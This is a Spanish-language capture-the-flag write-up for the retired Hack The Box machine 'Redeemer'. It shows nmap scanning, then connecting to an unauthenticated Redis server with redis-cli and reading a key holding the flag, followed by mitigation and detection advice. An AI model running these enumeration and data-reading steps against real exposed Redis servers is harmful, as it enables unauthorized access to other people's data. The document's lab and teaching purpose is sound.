---
machine: Redeemer
os: Linux
difficulty: Very Easy
platform: Hack The Box
achievement: https://labs.hackthebox.com/achievement/machine/4187928/472
category: Starting Point
state: Retired
pwned: 2026-11-02
tags: [linux, redis, no-auth]
---

# Redeemer — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> Máquina **Retired** de Starting Point (Tier 0). Sin flags en este documento.

## TL;DR

Redis escuchando sin contraseña. Se conecta con `redis-cli`, se enumeran las bases, y la flag está como valor de una clave. Dos comandos.

## Reconocimiento

```bash
nmap -Pn -p- --min-rate 2000 <TARGET_IP>
nmap -Pn -sV -p 6379 <TARGET_IP>
```

| Puerto | Servicio | Versión |
|---|---|---|
| 6379/tcp | Redis | sin autenticación |

## Foothold

```bash
redis-cli -h <TARGET_IP>
```

```
<IP>:6379> info
# Server
redis_version:...
# Clientes: 1
```

```
<IP>:6379> select 0
OK
<IP>:6379> keys *
1) "flag"
2) "temp"
3) "num"
<IP>:6379> get flag
"<FLAG>"
```

No hizo falta exploit ni credenciales: el puerto está expuesto y `protected-mode` está en `no`.

## Evidencia

- `nmap` con 6379 abierto y la versión de Redis.
- `keys *` y `get flag` con el valor recortado.

## Lecciones aprendidas

- Redis guarda datos en claro y sin cifrar: acceso al puerto = acceso a los datos.
- `select <n>` recorre las 16 bases por defecto; una clave puede estar en cualquier DB.
- Un servicio en un puerto poco habitual sigue siendo un servicio: `-p-` es obligatorio.

## Mitigaciones y detección

- `requirepass` con contraseña fuerte y ACLs (`ACL SETUSER`) por aplicación.
- `bind 127.0.0.1` y `protected-mode yes`; nunca exponer Redis a Internet.
- Deshabilitar comandos peligrosos (`CONFIG`, `EVAL`, `FLUSHALL`) para usuarios de aplicación.
- Detección: conexiones desde IPs no esperadas al 6379 y `AUTH` fallidos en el log.

## Referencias

- <https://redis.io/docs/latest/operate/oss_and_stack/management/security/>
- <https://book.hacktricks.wiki/en/network-services-pentesting/6379-pentesting-redis.html>
